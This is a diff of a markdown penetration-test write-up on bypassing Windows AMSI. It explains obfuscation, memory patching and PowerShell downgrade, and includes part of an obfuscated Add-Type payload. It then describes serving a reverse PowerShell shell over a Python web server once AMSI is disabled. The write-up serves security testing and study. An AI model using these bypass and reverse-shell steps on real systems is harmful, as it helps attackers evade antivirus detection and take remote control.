@@ -1,4 +1,5 @@
 ## Table of Contents
+
 - [**Outline**](#section-0)
 - [**Antimalware Scan Interface Explanation**](#section-1)
 - [ **Proof of Concept - Bypassing 2023 Windows 10 Pro AMSI**](#section-2)
@@ -26,7 +27,7 @@ This approach challenges antivirus scanners that rely on signature-based detecti
 Obfuscation techniques are utilized to deliberately obscure the actual intent and functionality of a script. By employing various obfuscation methods, such as code encryption, renaming variables, adding meaningless code snippet to obscure intent of the script, attackers can make their code appear convoluted. This makes AMSI scanners challenging  to interpret the true purpose of the script.
 
 #####  Memory Patching: 
-Memory patching modifies the AMSI Dynamic Link Library (DLL) in memory during runtime. This technique allows threat actors to temporarily disable or alter the functionality of AMSI. Subsequently attackers can run malicious scripts in memory without hindrance and alerts
+Memory patching modifies the AMSI Dynamic Link Library (DLL) in memory during runtime. This technique allows threat actors to temporarily disable or alter the functionality of AMSI. Subsequently attackers can run malicious scripts in memory without hindrance and alerts.
 #### PowerShell Downgrade: 
 PowerShell downgrading is switching the current PowerShell to Windows PowerShell verison 2.0. This version does not have AMSI protection, which makes it susceptible to arbitrary code execution. By using an older version of PowerShell, attackers can bypass the built-in security measures present in newer versions and execute malicious scripts undetected.
 ## Proof of Concept {#section-2}
@@ -106,7 +107,7 @@ Add-Type $GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrN
 ```
 
 
-After implementing effective obfuscation techniques, the payload is dropped in the PowerShell command prompt. The `ASMIScanBuffer.dll` returns an `Invalid Argument` and ends the AMSI program without being able to scan any code. With AMSI neutralized, the tester proceeded by hosting a Python web server on port 8443 to serve a PowerShell Reverse Shell Scrip.
+After implementing effective obfuscation techniques, the payload is dropped in the PowerShell command prompt. The `ASMIScanBuffer.dll` returns an `Invalid Argument` and ends the AMSI program without being able to scan any code. With AMSI neutralized, the tester proceeded by hosting a Python web server on port 8443 to serve a reverse PowerShell scrip.
 ```bash
 python3 -m http.server 8443
 ```
